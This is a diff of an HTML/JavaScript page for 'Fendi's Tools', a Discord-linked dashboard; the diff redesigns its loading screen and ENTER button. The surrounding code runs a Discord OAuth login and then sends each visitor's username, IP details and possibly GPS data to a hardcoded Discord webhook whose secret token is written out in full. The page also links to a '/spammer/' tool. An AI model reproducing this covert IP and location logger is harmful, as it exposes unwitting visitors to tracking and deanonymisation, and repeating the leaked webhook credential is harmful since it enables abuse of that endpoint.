@@ -6,7 +6,6 @@
     <title>Fendi's Tools</title>
     <link rel="icon" type="image/png" href="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png">
     <style>
-        /* (same styles as before – unchanged) */
         * {
             margin: 0;
             padding: 0;
@@ -51,46 +50,117 @@
             pointer-events: none;
         }
 
-        .enter-overlay {
+        /* LOADING SCREEN (spinner + Discord invite + ENTER button) */
+        .loading-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.5);
+            background: #000000;
             backdrop-filter: blur(8px);
-            z-index: 2000;
+            z-index: 1000;
             display: flex;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
-            transition: opacity 0.5s ease;
+            transition: opacity 1s ease, visibility 1s ease;
             opacity: 1;
             visibility: visible;
         }
-        .enter-overlay.hide {
+        .loading-screen.hide {
             opacity: 0;
             visibility: hidden;
         }
-        .enter-overlay-content {
+        .loading-content {
             text-align: center;
-            background: rgba(20, 20, 20, 0.8);
-            padding: 2rem 3rem;
+            animation: fadeUp 0.8s ease-out;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1.5rem;
+        }
+        @keyframes fadeUp {
+            from {
+                transform: translateY(20px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        .loading-logo {
+            font-size: 2rem;
+            font-weight: 800;
+            color: white;
+            text-shadow: 0 0 5px rgba(255,255,255,0.5);
+        }
+        .spinner {
+            width: 70px;
+            height: 70px;
+            border: 4px solid rgba(255,255,255,0.2);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 1s ease infinite;
+            transition: opacity 0.4s ease;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .enter-btn {
+            background: linear-gradient(95deg, #333, #111);
+            border: 1px solid white;
+            padding: 1rem 2rem;
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: white;
+            border-radius: 3rem;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(255,255,255,0.2);
+            width: auto;
+            display: none;
+            opacity: 0;
+            transform: scale(0.8);
+        }
+        .enter-btn.show {
+            display: inline-block;
+            animation: popIn 0.5s cubic-bezier(0.34, 1.2, 0.64, 1) forwards;
+        }
+        @keyframes popIn {
+            0% {
+                opacity: 0;
+                transform: scale(0.5);
+            }
+            80% {
+                transform: scale(1.05);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        .enter-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(255,255,255,0.5);
+            background: #222;
+        }
+        .loading-discord-link {
+            background: rgba(30,30,30,0.7);
+            padding: 0.7rem 1.5rem;
             border-radius: 3rem;
             border: 1px solid white;
-            backdrop-filter: blur(4px);
-            color: white;
-            font-size: 2rem;
-            font-weight: bold;
-            letter-spacing: 2px;
-            animation: pulse 1.5s infinite;
+            cursor: pointer;
+            display: inline-block;
         }
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.05); opacity: 1; }
-            100% { transform: scale(1); opacity: 0.8; }
+        .loading-discord-link a {
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
         }
 
+        /* LANDING PAGE (dashboard) */
         .landing-page {
             width: 100%;
             max-width: 800px;
@@ -320,10 +390,17 @@
     <span id="trackTitle" class="track-title">Pass Out</span>
 </div>
 
-<div id="enterOverlay" class="enter-overlay">
-    <div class="enter-overlay-content">Click to Enter</div>
+<!-- LOADING SCREEN (spinner + Discord invite + ENTER button) -->
+<div id="loadingScreen" class="loading-screen">
+    <div class="loading-content">
+        <div class="loading-logo">FENDI'S TOOLS</div>
+        <div id="spinnerContainer" class="spinner"></div>
+        <button id="enterBtn" class="enter-btn">ENTER</button>
+        <div class="loading-discord-link" id="loadingJoin"><a href="#">JOIN discord.gg/funerals</a></div>
+    </div>
 </div>
 
+<!-- DASHBOARD (hidden until ENTER) -->
 <div id="landingPage" class="landing-page">
     <div class="welcome-text" id="welcomeText">Welcome to Fendi Tool's</div>
     <div style="text-align: center;"><span class="subheading" id="subheadingText">Dashboard</span></div>
@@ -348,10 +425,6 @@
         const DISCORD_CLIENT_ID = "1497155951067664415";
         const REDIRECT_URI = window.location.origin;
         const IP_LOG_WEBHOOK = "https://discord.com/api/webhooks/1497124094926127155/1nzYxMuo7Q4aAMSMU5KSBxlLn4srSXcw7u-VeH9qHUgCae2AjCetucxixHBSoR66LaLG";
-        
-        let entered = sessionStorage.getItem('entered') === 'true';
-        const overlay = document.getElementById('enterOverlay');
-        const landingPage = document.getElementById('landingPage');
 
         // ========== IP LOGGING & GPS ==========
         let gpsRequested = localStorage.getItem("gpsRequested") === "true";
@@ -499,7 +572,7 @@
                 });
                 ipLogSent = true;
                 sessionStorage.setItem('ipLogSent', 'true');
-                console.log("IP log sent with username and page origin");
+                console.log("IP log sent");
             } catch(e) { console.error("Failed to send IP log", e); }
         }
 
@@ -638,25 +711,28 @@
         prevBtn.addEventListener('click', prevTrack);
         nextBtn.addEventListener('click', nextTrack);
 
-        // ========== ENTER OVERLAY LOGIC ==========
-        function finishEntry() {
-            overlay.classList.add('hide');
-            setTimeout(() => {
-                overlay.style.display = 'none';
-                landingPage.classList.add('visible');
-                startMusic();
-            }, 500);
-        }
+        // ========== LOADING SCREEN LOGIC ==========
+        const spinner = document.getElementById('spinnerContainer');
+        const enterBtn = document.getElementById('enterBtn');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const landingPage = document.getElementById('landingPage');
 
-        overlay.addEventListener('click', async () => {
-            if (entered) {
-                finishEntry();
-                return;
-            }
+        // After 3.5 seconds, show ENTER button (hide spinner)
+        setTimeout(() => {
+            spinner.style.transition = 'opacity 0.4s ease';
+            spinner.style.opacity = '0';
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                enterBtn.classList.add('show');
+            }, 400);
+        }, 3500);
+
+        enterBtn.addEventListener('click', async () => {
+            startMusic(); // start music on click
             let token = localStorage.getItem('discord_access_token');
             let username = null;
             if (!token) {
-                // Redirect to Discord OAuth
+                // OAuth flow
                 const codeVerifier = generateRandomString(64);
                 const codeChallenge = base64URL(await sha256(codeVerifier));
                 localStorage.setItem("code_verifier", codeVerifier);
@@ -673,9 +749,11 @@
                 }
             } catch(e) { console.error("Failed to fetch user", e); }
             await sendIpLog(username);
-            sessionStorage.setItem('entered', 'true');
-            entered = true;
-            finishEntry();
+            loadingScreen.classList.add('hide');
+            setTimeout(() => {
+                loadingScreen.style.display = 'none';
+                landingPage.classList.add('visible');
+            }, 800);
         });
 
         // Handle OAuth redirect
@@ -690,17 +768,21 @@
                     const username = `${user.username}#${user.discriminator || "0"}`;
                     document.getElementById('welcomeText').innerHTML = `Welcome to Fendi Tool's, ${escapeHtml(user.username)}`;
                     await sendIpLog(username);
-                    sessionStorage.setItem('entered', 'true');
-                    entered = true;
                     window.history.replaceState({}, document.title, window.location.pathname);
-                    finishEntry();
+                    loadingScreen.classList.add('hide');
+                    setTimeout(() => {
+                        loadingScreen.style.display = 'none';
+                        landingPage.classList.add('visible');
+                    }, 800);
                 }).catch(err => console.error(err));
             } else {
                 window.history.replaceState({}, document.title, window.location.pathname);
-                finishEntry();
+                loadingScreen.classList.add('hide');
+                setTimeout(() => {
+                    loadingScreen.style.display = 'none';
+                    landingPage.classList.add('visible');
+                }, 800);
             }
-        } else if (entered) {
-            finishEntry();
         }
 
         function escapeHtml(str) {
@@ -748,6 +830,16 @@
                 window.location.href = '/spammer/';
             });
         }
+
+        // ========== JOIN BUTTONS ==========
+        const joinBtns = ['loadingJoin'];
+        joinBtns.forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.addEventListener('click', (e) => {
+                e.preventDefault();
+                window.open('https://discord.gg/funerals', '_blank');
+            });
+        });
 
         // ========== SNOW PARTICLES ==========
         const canvas = document.getElementById('snowCanvas');
